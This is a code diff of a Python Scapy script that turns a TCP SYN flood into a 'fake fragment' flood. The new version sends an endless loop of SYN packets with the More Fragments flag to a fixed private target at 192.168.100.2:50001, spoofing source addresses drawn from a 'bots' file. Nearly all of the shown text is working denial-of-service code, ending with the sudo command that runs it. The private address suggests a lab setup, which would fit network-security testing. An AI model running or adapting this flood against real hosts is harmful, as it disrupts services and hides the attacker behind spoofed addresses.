@@ -5,7 +5,7 @@ import time
 import sys
 import ipaddress
 
-# TCP SYN Flood
+# TCP Fake Frag
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
 BOTFILE = "../bots.txt"
@@ -23,8 +23,7 @@ def load_bots(filename):
 
     return bot_ips
 
-def run_tcp_flood_attack():
-    """TCP SYN Flood Attack"""
+def run_tcp_fake_frag():
     bot_ips = load_bots(BOTFILE)
 
     numero_de_pacotes_enviados = 0
@@ -34,7 +33,7 @@ def run_tcp_flood_attack():
     while True:
         source_ip = random.choice(bot_ips)
 
-        ip_layer = IP(src=source_ip, dst=TARGET_IP)
+        ip_layer = IP(src=source_ip, dst=TARGET_IP, flags="MF")
         eth_layer = Ether()
         seq_num = random.randint(0, 4294967295)
         tcp_layer = TCP(sport=RandShort(),dport=TARGET_PORT, flags='S', seq=seq_num, window=8192)
@@ -59,6 +58,6 @@ def run_tcp_flood_attack():
 
 
 if __name__ == "__main__":
-    run_tcp_flood_attack()
+    run_tcp_fake_frag()
 
-# sudo PYTHONPATH=$HOME/scapy python3 tcp_syn_flood.py
+# sudo PYTHONPATH=$HOME/scapy python3 tcp_fake_frag.py
